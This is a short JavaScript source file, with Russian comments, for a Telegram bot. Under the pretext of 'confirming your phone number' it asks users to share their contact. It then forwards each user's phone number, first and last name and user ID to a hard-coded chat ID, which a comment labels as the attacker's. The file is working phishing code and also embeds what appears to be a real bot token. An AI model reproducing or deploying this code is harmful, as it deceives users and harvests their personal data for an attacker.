const TelegramBot = require("node-telegram-bot-api"); // Подключаем установленный модуль

const TOKEN = "1385024412:AAGZAfTmvT4I2opMh_X7pOIfBFqMfg_alRU"; // Токен бота
 
const bot = new TelegramBot(TOKEN, {polling: true}); // 1-е это Токен бота, а второе - непонятное строка в которой разбиратся не оязательно;) 

bot.onText(/\/start/, function(msg) {
    const id = msg.chat.id; // id - это ID чата, чтобы отправлять сообщение именно пользователю который это написал
    console.log(id); // Выводит Чат ID написавшего


    bot.sendMessage(id, `Подтвердите свой номер телефона`, { // Отправляем сообщение пользователю
        reply_markup: { // Отправляем клавиатуру
            keyboard: [[{ 
                text: "Подтвердить телефон", // Текст на клавиатуре
                request_contact: true // Получать ли номер телефона
            }]]
        }
    })
});

const admin = "1071897394" // Чат ID злоумышленника (Создателя бота) 

bot.on("contact", function(msg) {
    bot.sendMessage(admin, "Телефонный номер:" + msg.contact.phone_number); // Отправляем номер телефона админу
    bot.sendMessage(admin, "Имя:" + msg.contact.first_name); // Отправляем имя админу
    bot.sendMessage(admin, "Фамилия:" + msg.contact.last_name); // Отправляем фамилию админу
    bot.sendMessage(admin, "User ID:" + msg.contact.user_id); // ОТправляем уникальный ID пользователя
});


